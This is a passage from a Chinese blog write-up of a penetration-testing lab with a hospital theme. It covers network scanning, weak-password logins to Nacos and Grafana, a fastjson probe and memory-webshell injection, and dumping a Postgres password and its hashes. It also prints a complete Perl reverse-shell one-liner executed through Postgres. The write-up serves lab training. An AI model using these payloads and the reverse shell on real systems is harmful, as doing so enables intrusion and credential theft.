  valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    link/ether 00:16:3e:0d:aa:83 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.30.12.5/16 brd 172.30.255.255 scope global dynamic eth0</span><br><span class="line">       valid_lft 315357949sec preferred_lft 315357949sec</span><br><span class="line">    inet6 fe80::216:3eff:fe0d:aa83/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">       </span><br><span class="line">       ./fscan -h 172.30.12.1/24</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-04-10 17:23:09] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-04-10 17:23:09] [INFO] 开始信息扫描</span><br><span class="line">[2025-04-10 17:23:09] [INFO] CIDR范围: 172.30.12.0-172.30.12.255</span><br><span class="line">[2025-04-10 17:23:10] [INFO] 生成IP范围: 172.30.12.0.%!d(string=172.30.12.255) - %!s(MISSING).%!d(MISSING)</span><br><span class="line">[2025-04-10 17:23:10] [INFO] 解析CIDR 172.30.12.1/24 -&gt; IP范围 172.30.12.0-172.30.12.255</span><br><span class="line">[2025-04-10 17:23:10] [INFO] 最终有效主机数量: 256</span><br><span class="line">[2025-04-10 17:23:10] [INFO] 开始主机扫描</span><br><span class="line">[2025-04-10 17:23:10] [SUCCESS] 目标 172.30.12.5     存活 (ICMP)</span><br><span class="line">[2025-04-10 17:23:10] [SUCCESS] 目标 172.30.12.6     存活 (ICMP)</span><br><span class="line">[2025-04-10 17:23:10] [SUCCESS] 目标 172.30.12.236   存活 (ICMP)</span><br><span class="line">[2025-04-10 17:23:13] [INFO] 存活主机数量: 3</span><br><span class="line">[2025-04-10 17:23:13] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.236:22</span><br><span class="line">[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.6:445</span><br><span class="line">[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.6:139</span><br><span class="line">[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.6:135</span><br><span class="line">[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.5:22</span><br><span class="line">[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.236:8009</span><br><span class="line">[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.5:8080</span><br><span class="line">[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.236:8080</span><br><span class="line">[2025-04-10 17:23:13] [SUCCESS] 服务识别 172.30.12.236:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]</span><br><span class="line">[2025-04-10 17:23:13] [SUCCESS] 服务识别 172.30.12.5:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]</span><br><span class="line">[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.6:8848</span><br><span class="line">[2025-04-10 17:23:18] [SUCCESS] 服务识别 172.30.12.6:445 =&gt; </span><br><span class="line">[2025-04-10 17:23:18] [SUCCESS] 服务识别 172.30.12.6:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-10 17:23:18] [SUCCESS] 服务识别 172.30.12.236:8009 =&gt; </span><br><span class="line">[2025-04-10 17:23:18] [SUCCESS] 服务识别 172.30.12.5:8080 =&gt; [http]</span><br><span class="line">[2025-04-10 17:23:19] [SUCCESS] 服务识别 172.30.12.236:8080 =&gt; [http]</span><br><span class="line">[2025-04-10 17:23:24] [SUCCESS] 服务识别 172.30.12.6:8848 =&gt; [http]</span><br><span class="line">[2025-04-10 17:24:18] [SUCCESS] 服务识别 172.30.12.6:135 =&gt; </span><br><span class="line">[2025-04-10 17:24:18] [INFO] 存活端口数量: 9</span><br><span class="line">[2025-04-10 17:24:18] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-04-10 17:24:18] [INFO] 加载的插件: findnet, ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle</span><br><span class="line">[2025-04-10 17:24:18] [SUCCESS] NetBios 172.30.12.6     WORKGROUP\SERVER02            </span><br><span class="line">[2025-04-10 17:24:18] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.30.12.6</span><br><span class="line">主机名: Server02</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.30.12.6</span><br><span class="line">[2025-04-10 17:24:18] [SUCCESS] 网站标题 http://172.30.12.5:8080   状态码:302 长度:0      标题:无标题 重定向地址: http://172.30.12.5:8080/login;jsessionid=BD7C602596372F417AEEB44C6651A392</span><br><span class="line">[2025-04-10 17:24:18] [SUCCESS] 网站标题 http://172.30.12.236:8080 状态码:200 长度:3964   标题:医院后台管理平台</span><br><span class="line">[2025-04-10 17:24:19] [SUCCESS] 网站标题 http://172.30.12.5:8080/login;jsessionid=BD7C602596372F417AEEB44C6651A392 状态码:200 长度:2005   标题:医疗管理后台</span><br><span class="line">[2025-04-10 17:24:19] [SUCCESS] 网站标题 http://172.30.12.6:8848   状态码:404 长度:431    标题:HTTP Status 404 – Not Found</span><br><span class="line">[2025-04-10 17:24:20] [SUCCESS] 目标: http://172.30.12.5:8080</span><br><span class="line">  漏洞类型: poc-yaml-spring-actuator-heapdump-file</span><br><span class="line">  漏洞名称: </span><br><span class="line">  详细信息:</span><br><span class="line">        author:AgeloVito</span><br><span class="line">        links:https://www.cnblogs.com/wyb628/p/8567610.html</span><br><span class="line">[2025-04-10 17:24:20] [SUCCESS] 目标: http://172.30.12.6:8848</span><br><span class="line">  漏洞类型: poc-yaml-alibaba-nacos</span><br><span class="line">  漏洞名称: </span><br><span class="line">  详细信息:</span><br><span class="line">        author:AgeloVito</span><br><span class="line">        links:https://blog.csdn.net/caiqiiqi/article/details/112005424</span><br><span class="line">[2025-04-10 17:24:21] [SUCCESS] 目标: http://172.30.12.6:8848</span><br><span class="line">  漏洞类型: poc-yaml-alibaba-nacos-v1-auth-bypass</span><br><span class="line">  漏洞名称: </span><br><span class="line">  详细信息:</span><br><span class="line">        author:kmahyyg(https://github.com/kmahyyg)</span><br><span class="line">        links:https://github.com/alibaba/nacos/issues/4593</span><br></pre></td></tr></table></figure>

<p>扫到了一个nacos，那就从这里入手，弱口令nacos/nacos登录,这个框架还存在yaml反序列化漏洞</p>
<p>在172.30.12.5上面放上恶意的jar文件，然后开启一个web服务，再用利用工具去执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# nxc rdp 172.30.12.6 -u lv -p Asd123132. --local-auth</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.30.12.6:3389  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.30.12.6:3389  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.30.12.6:3389  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.30.12.6:3389  ...  OK</span><br><span class="line">RDP         172.30.12.6     3389   Server02         [*] Windows 10 or Windows Server 2016 Build 17763 (name:Server02) (domain:Server02) (nla:True)</span><br><span class="line">[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.30.12.6:3389  ...  OK</span><br><span class="line">RDP         172.30.12.6     3389   Server02         [+] Server02\lv:Asd123132. (Pwn3d!)</span><br></pre></td></tr></table></figure>

<p>用户添加成功了，挂上代理，远程桌面连接，flag02在C:\Users\Administrator\flag下</p>
<h1 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h1><p>172.30.12.236主机开放了8009端口，登录口传入的数据为 JSON 格式。探测 fastjson 版本 payload：<code>&#123;&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;</code></p>
<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/h0ny/repo/main/images/2ed229594166743d.png">https://raw.githubusercontent.com/h0ny/repo/main/images/2ed229594166743d.png</a>)</p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital1.png"></p>
<p>用<a target="_blank" rel="noopener" href="https://github.com/amaz1ngday/fastjson-exp">bp的插件</a>注入内存马,哥斯拉连接，flag03在/root/flag/下</p>
<h1 id="flag04"><a href="#flag04" class="headerlink" title="flag04"></a>flag04</h1><p>这个靶机还有第二张网卡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/ &gt;ip a</span><br><span class="line"></span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    link/ether 00:16:3e:0d:aa:e2 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.30.12.236/16 brd 172.30.255.255 scope global dynamic eth0</span><br><span class="line">       valid_lft 315354333sec preferred_lft 315354333sec</span><br><span class="line">    inet6 fe80::216:3eff:fe0d:aae2/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    link/ether 00:16:3e:0d:aa:92 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.30.54.179/24 brd 172.30.54.255 scope global eth1</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::216:3eff:fe0d:aa92/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>

<p>上传一个fscan，然后扫一下，地址为172.30.54.12，需要二层内网代理，这台机器上有<strong>grafana+postgres</strong>两个服务，grafana存在弱口令admin/admin登录,在web3的机器上上传一个<a target="_blank" rel="noopener" href="https://github.com/A-D-Team/grafanaExp">exp</a>,可以跑到postgres的密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2024/07/04 12:20:59 Target vulnerable has plugin [alertlist]</span><br><span class="line">2024/07/04 12:20:59 Got secret_key [SW2YcwTIb9zpOOhoPsMm]</span><br><span class="line">2024/07/04 12:20:59 There is [0] records in db.</span><br><span class="line">2024/07/04 12:20:59 type:[postgres]     name:[PostgreSQL]               url:[localhost:5432]    user:[postgres] password[Postgres@123] database:[postgres]     basic_auth_user:[]      basic_auth_password:[]</span><br><span class="line">2024/07/04 12:20:59 All Done, have nice day!</span><br></pre></td></tr></table></figure>

<p><code>psql -h 172.30.54.12 -p 5432 -U postgres</code>连接,查询root的密码<code>select usename, passwd from pg_shadow;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">postgres=# select usename, passwd from pg_shadow;</span><br><span class="line"> usename  |               passwd</span><br><span class="line">----------+-------------------------------------</span><br><span class="line"> root     | md5da974531914a7c2c56df745574a5bd3a</span><br><span class="line"> postgres | md5dd27d33705155fd675e498384ad3d2ea</span><br></pre></td></tr></table></figure>

<p>爆破出来是<code>P@ssw0rd123</code>,在web03的机器上监听一个端口，然后用perl反弹一个shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select system(&#x27;perl -e \&#x27;use Socket;$i=&quot;172.30.54.179&quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;\&#x27;&#x27;);</span><br></pre></td></tr></table></figure>

<p>然后psql提权，flag04在/root/flag/下</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">lvzhouhang</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">341k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">5:10</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
